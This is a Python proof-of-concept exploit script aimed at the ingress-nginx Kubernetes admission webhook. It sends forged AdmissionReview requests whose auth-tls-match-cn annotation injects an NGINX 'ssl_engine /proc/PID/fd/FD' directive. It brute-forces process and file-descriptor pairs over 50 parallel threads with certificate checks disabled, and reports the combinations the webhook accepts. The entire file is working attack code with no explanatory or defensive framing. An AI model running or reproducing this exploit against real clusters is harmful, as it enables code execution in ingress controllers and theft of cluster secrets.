#!/usr/bin/env python3

import requests
import json
import threading
import concurrent.futures
import urllib3
from queue import Queue

# Global configuration for easy customization
CONFIG = {
    "url": "https://localhost:8443/",
    "headers": {
        "Content-Type": "application/json"
    },
    "pid_range": range(1, 50),  # Range of process IDs to test
    "fd_range": range(1, 100),  # Range of file descriptors to test
    "max_workers": 50,          # Number of concurrent threads
    "request_timeout": 10,      # Request timeout in seconds
    "namespace": "default",     # Kubernetes namespace
    "tls_secret": "ingress-nginx/tls-poc"  # TLS secret reference
}

def create_payload(pid, fd):
    """
    Create the JSON payload for the admission webhook request with the specified PID and FD.
    
    Args:
        pid (int): Process ID to test
        fd (int): File descriptor to test
        
    Returns:
        dict: The complete payload for the admission webhook request
    """
    # Create the TLS match CN string with NGINX configuration injection
    tls_match_cn = f"CN=abc #(\n){{}}\n }}}}\nssl_engine /proc/{pid}/fd/{fd};\n#"
    
    return {
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview",
        "request": {
            "uid": "11111111-2222-3333-4444-555555555555",
            "kind": {
                "group": "networking.k8s.io",
                "version": "v1",
                "kind": "Ingress"
            },
            "resource": {
                "group": "networking.k8s.io",
                "version": "v1",
                "resource": "ingresses"
            },
            "namespace": CONFIG["namespace"],
            "operation": "CREATE",
            "object": {
                "apiVersion": "networking.k8s.io/v1",
                "kind": "Ingress",
                "metadata": {
                    "name": "deads",
                    "annotations": {
                        "nginx.ingress.kubernetes.io/auth-tls-match-cn": tls_match_cn,
                        "nginx.ingress.kubernetes.io/auth-tls-secret": CONFIG["tls_secret"]
                    }
                },
                "spec": {
                    "ingressClassName": "nginx",
                    "rules": [
                        {
                            "host": "myservicea.foo.org",
                            "http": {
                                "paths": [
                                    {
                                        "path": "/",
                                        "pathType": "Prefix",
                                        "backend": {
                                            "service": {
                                                "name": "myservicea",
                                                "port": {
                                                    "number": 80
                                                }
                                            }
                                        }
                                    }
                                ]
                            }
                        }
                    ]
                }
            }
        }
    }

def try_pid_fd_combination(pid, fd, results_queue):
    """
    Test a specific PID/FD combination by sending a request to the admission webhook.
    
    Args:
        pid (int): Process ID to test
        fd (int): File descriptor to test
        results_queue (Queue): Queue to store successful results
    """
    payload = create_payload(pid, fd)

    try:
        # Suppress InsecureRequestWarning
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        response = requests.post(
            CONFIG["url"],
            headers=CONFIG["headers"],
            data=json.dumps(payload),
            verify=False,  # Equivalent to curl -k (insecure)
            timeout=CONFIG["request_timeout"]
        )

        # Check if the response contains JSON data
        try:
            response_json = response.json()
            # Extract and print the status from the response if it exists
            if 'response' in response_json and 'status' in response_json['response']:
                status = response_json['response']['status']['status']
                print(f"Attempt /proc/{pid}/fd/{fd} => {status}")
                
                # If we find a successful response, add it to the queue
                if status == "Success":
                    results_queue.put((pid, fd, status))
            else:
                print(f"Attempt /proc/{pid}/fd/{fd} => Response JSON does not contain 'response.status' field")
        except ValueError:
            print(f"Attempt /proc/{pid}/fd/{fd} => Response is not valid JSON")

    except requests.exceptions.RequestException as e:
        # In case the request fails, log it
        print(f"Request for PID={pid}, FD={fd} failed: {e}")

def main():
    """
    Main function to orchestrate the brute force testing of PID/FD combinations.
    """
    # Create a queue to store successful results
    results_queue = Queue()
    
    # Generate all combinations of PIDs and FDs
    combinations = []
    for pid in CONFIG["pid_range"]:
        for fd in CONFIG["fd_range"]:
            combinations.append((pid, fd))
    
    # Use ThreadPoolExecutor to parallelize requests
    print(f"Starting parallel execution with {len(combinations)} combinations...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONFIG["max_workers"]) as executor:
        futures = {
            executor.submit(try_pid_fd_combination, pid, fd, results_queue): (pid, fd) 
            for pid, fd in combinations
        }
        
        for future in concurrent.futures.as_completed(futures):
            pid, fd = futures[future]
            try:
                future.result()
            except Exception as exc:
                print(f"Combination {pid}/{fd} generated an exception: {exc}")
    
    # Check if we found any successful combinations
    if not results_queue.empty():
        print("\nSuccessful combinations found:")
        while not results_queue.empty():
            pid, fd, status = results_queue.get()
            print(f"SUCCESS: /proc/{pid}/fd/{fd} => {status}")
    else:
        print("\nNo successful combinations found.")

if __name__ == "__main__":
    main()
